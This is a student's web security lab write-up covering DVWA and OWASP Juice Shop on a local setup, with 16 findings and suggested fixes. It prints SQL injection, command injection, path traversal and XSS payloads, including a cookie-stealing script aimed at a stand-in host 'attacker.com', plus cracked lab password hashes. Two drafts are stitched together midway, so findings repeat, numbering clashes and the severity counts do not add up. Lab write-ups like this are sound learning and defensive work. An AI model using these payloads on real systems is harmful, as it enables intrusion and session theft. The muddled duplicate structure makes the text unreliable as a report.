# Web App Security Assessment — DVWA + Juice Shop

**Done by:** WaiLinOo  

**Apps tested:** DVWA (security=low), OWASP Juice Shop  
**Tools:** Burp Suite, SQLmap, Nikto, custom Python fuzzer

This is my write-up of the vulnerabilities I found during the lab. Not 100% complete yet.

## How I did this
Started with DVWA on low difficulty because I wanted to understand why each vulnerability works, not just find them by running automated scanners. Then moved to Juice Shop which was harder because it's a real-ish app. Used Burp Intruder a lot at first, then got tired of clicking manually so I wrote the fuzzer to automate it. Writing the fuzzer actually helped me understand how SQLmap works under the hood, which was the whole point of the lab for me.

---

## Findings summary

| # | Vuln | App | Severity |
|---|------|-----|----------|
| 1 | SQL Injection (UNION) | DVWA | Critical |
| 2 | SQL Injection login bypass | Juice Shop | Critical |
| 3 | RCE via command injection | DVWA | Critical |
| 4 | Stored XSS | DVWA | High |
| 5 | Reflected XSS | DVWA | Medium |
| 6 | DOM XSS | DVWA | Medium |
| 7 | LFI | DVWA | High |
| 8 | IDOR on basket | Juice Shop | High |
| 9 | Admin panel no auth | Juice Shop | High |
| 10 | MD5 passwords no salt | DVWA | High |
| 11 | No rate limiting | Juice Shop | Medium |
| 12 | Verbose SQL errors | DVWA | Low |
| 13 | Default creds | DVWA | Medium |
| 14 | Missing CSRF | DVWA | Medium |
| 15 | No login logging | DVWA | Low |
| 16 | Server version in headers | DVWA | Low |

---

## Finding 1 — SQL Injection (DVWA)

**Severity:** Critical

The id parameter on the SQLi page is just passed straight into the query. No sanitisation at all.

Tested with `' OR 1=1-- -` first to confirm it was injectable, then used ORDER BY to figure out there were 2 columns, then UNION SELECT to dump the database.

```
' UNION SELECT null,database()-- -   →  dvwa
' UNION SELECT user,password FROM users-- -  →  got all 5 users + hashes
```

Hashes were all MD5, cracked them all on crackstation in like 2 seconds. admin was just "password".

Also ran SQLmap to confirm — it picked up everything automatically.

**Fix:** Use prepared statements. The query should never be built by concatenating user input.

---

## Finding 2 — SQL Injection login bypass (Juice Shop)

**Severity:** Critical

Same issue but on the login form. Typed `' OR 1=1-- -` in the email field and logged straight in as admin. Juice Shop showed the challenge notification which was cool.

**Fix:** Same as above — parameterise the query.

---

## Finding 3 — Command Injection / RCE (DVWA)

**Severity:** Critical

The ping page passes input to the shell without sanitising it. So you can just chain commands:

```
127.0.0.1; id
```

Got back `uid=33(www-data)` which confirms the command ran. Then tried `cat /etc/passwd` and it just printed the whole file.

This is basically full remote code execution on the web server.

**Fix:** Don't use shell functions for things like ping. Use a native library instead. If you have to use shell, whitelist the input.

---

## Finding 4 — Stored XSS (DVWA)

**Severity:** High

The guestbook stores whatever you type and renders it back without encoding. The name field has a maxlength attribute but that's client-side, just deleted it in devtools.

Put in `<script>document.location='http://attacker.com?c='+document.cookie</script>` and it would run for every visitor.

(screenshots to be added)

**Fix:** HTML encode output. Never trust stored input.

---

## Finding 5 — Reflected XSS (DVWA)

**Severity:** Medium

The name parameter in the XSS reflected page reflects input straight back. `<script>alert('XSS')</script>` in the URL fires an alert immediately.

Also works with `<img src=x onerror=alert(1)>` if script tags get filtered.

**Fix:** Encode output contextually. CSP header would help as defence in depth.

---

## Finding 6 — DOM XSS (DVWA)

**Severity:** Medium

This one was interesting — the payload never actually hits the server. The page reads the default URL param and writes it to the DOM with document.write() without sanitising it.

So the Burp response is totally clean but the browser still executes the script. Can't detect it with server-side scanning.

(screenshots to be added)

**Fix:** Use textContent instead of innerHTML/document.write. Sanitise JS-side before touching the DOM.

---

## Finding 7 — Local File Inclusion (DVWA)

**Severity:** High

The page parameter just gets passed to PHP include(). Path traversal straight to /etc/passwd:

```
?page=../../../../../../etc/passwd
```

Also tried the PHP filter wrapper to read PHP source:
```
?page=php://filter/convert.base64-encode/resource=index.php
```

allow_url_include was off so no remote file inclusion, but LFI is already bad enough.

**Fix:** Whitelist which pages can be included. Never pass user input to include().

---

## Finding 8 — IDOR on Basket API (Juice Shop)

## DVWA + Juice Shop Lab

**Date:** June 2024  
**Tester:** WaiLinOo  
**Target:** DVWA (localhost:80) and OWASP Juice Shop (localhost:3000)  
**Scope:** local docker environment, everything in scope

---

## Overview

did a full run through of DVWA and juice shop testing for the OWASP top 10. found a bunch of vulns. writing this up as best i can.

tools used: burp suite, sqlmap, nikto, my own fuzzer script, browser devtools

---

## Findings

### 1. SQL Injection (DVWA)

**Severity:** Critical  
**Endpoint:** /dvwa/vulnerabilities/sqli/

found a basic sqli on the id parameter. no sanitisation at all. was able to dump the whole users table with UNION SELECT.

payload that worked:
```
' UNION SELECT user,password FROM users-- -
```

got back all 5 users and their MD5 hashes. cracked them all with crackstation in like 2 seconds because they were unsalted.

**Fix:** use prepared statements. never concatenate user input into SQL.

---

### 2. SQL Injection - login bypass (Juice Shop)

**Severity:** Critical

typed `' OR 1=1-- -` into the email field on the login page, put anything as the password, and got logged in as admin. juice shop even showed a little popup saying challenge completed lol.

**Fix:** parameterised queries

---

### 3. Command Injection / RCE (DVWA)

**Severity:** Critical  
**Endpoint:** /dvwa/vulnerabilities/exec/

the ping utility literally just passes input to exec(). typed `127.0.0.1; id` and got back uid=33(www-data). then did `; cat /etc/passwd` and got the whole file. this is probably the scariest one.

(screenshots to be added)

**Fix:** don't use exec() with user input. if you need ping functionality use a proper library.

---

### 4. XSS - Reflected (DVWA)

**Severity:** Medium  
**Endpoint:** /dvwa/vulnerabilities/xss_r/

`<script>alert('XSS')</script>` in the name parameter reflected straight back. no encoding at all. also tried `<img src=x onerror=alert(1)>` which also worked, and svg onload.

---

### 5. XSS - Stored (DVWA)

**Severity:** High

the guestbook name field has a maxlength=10 in the html but that's client side so i just removed it in devtools. submitted a script tag and it fires every time someone loads the page. in a real scenario you'd use this to steal session cookies.

---

### 6. XSS - DOM Based (DVWA)

**Severity:** Medium

this one was interesting. the payload never even hits the server. the page reads from the URL and writes it into the DOM with document.write(). found it by looking at the page source. burp doesn't catch it because the server response is totally clean.

```
?default=<script>alert('DOM XSS')</script>
```

---

### 7. Local File Inclusion (DVWA)

**Severity:** High  
**Endpoint:** /dvwa/vulnerabilities/fi/

the page parameter just includes whatever file you tell it to. path traversal works:

```
?page=../../../../../../etc/passwd
```

printed the full passwd file. allow_url_include was off so couldn't do remote file inclusion but LFI is bad enough.

also found you can read php source with:
```
?page=php://filter/convert.base64-encode/resource=index.php
```

---

### 8. IDOR (Juice Shop)

**Severity:** High  
**Endpoint:** POST /api/BasketItems

added something to my basket and caught the request in burp. changed BasketId from 2 to 1 and got 201 Created - added to someone else's basket. no server-side ownership check.

(screenshots to be added)

---

### 9. Admin panel - broken access control (Juice Shop)

**Severity:** High

navigated directly to /#/administration while logged in as a normal user. it loaded and showed all user emails. the check is only in the frontend router, not the API.

---

### 10. Weak password hashing (DVWA)

**Severity:** High

got the password hashes from the SQLi dump. all MD5 with no salt. cracked all 5 in under 5 seconds on crackstation.

| user | hash | password |
|------|------|----------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |

**Fix:** bcrypt or argon2, always salt

---

### 11. No rate limiting (Juice Shop)

**Severity:** Med  
**Endpoint:** POST /rest/user/login

sent 50 requests in burp intruder with no delay - all came back 401, no lockout, no 429, no slowdown. ran hydra too and it just kept going at like 100 req/s.

---

## Finding 12 — Verbose SQL Errors (DVWA)

**Severity:** Medium

Put a single quote in the id field and got back the full MySQL error with version info and partial query. Helped me figure out exactly how to write my UNION payload.

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1
```

---
### 13. Default credentials (DVWA + Juice Shop)

**Severity:** Medium

DVWA: admin/password - worked first try  
Juice Shop: admin@juice-sh.op / admin123 - worked first try

---

### 14. CSRF (DVWA)

**Severity:** Medium

password change form has no csrf token. made a poc page with a hidden img tag pointing at the change URL - if a logged in user loads it their password changes silently.

---

### 15. No failed login logging (DVWA)

**Severity:** Low

ran a brute force and checked the logs - nothing. no record of the attempts at all.

---

### 16. Server version exposed in headers (DVWA)

**Severity:** Low

Apache/2.4.25 and PHP/7.0.33 in response headers. both super old. Apache 2.4.25 is from like 2016.

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 5 |
| Medium | 5 |
| Low | 2 |
| Med | 1 |

total: 16 findings across both apps

---

## What I didn't finish
These are the things I wanted to test but didn't get to, either because I ran out of time or hit a wall:
XXE (XML External Entity)

Spent like 2 hours trying to set up Burp Collaborator to catch out-of-band responses, couldn't get it working
Didn't find any obvious XML endpoints in either app anyway
Would test this if I had more time

SSRF (Server-Side Request Forgery)

Looked for endpoints that make external requests but couldn't find any
Juice Shop has some file upload stuff but it didn't seem exploitable in the way I understood it

JWT in Juice Shop

I know the app uses JWT for auth, and I've heard there's something exploitable about it
Didn't get far enough into it to document properly though — just wanted to flag it

Blind SQL Injection with Time-based Delays

Commented it out in the fuzzer because the timing was too unreliable
Would need a better approach to confirm this works
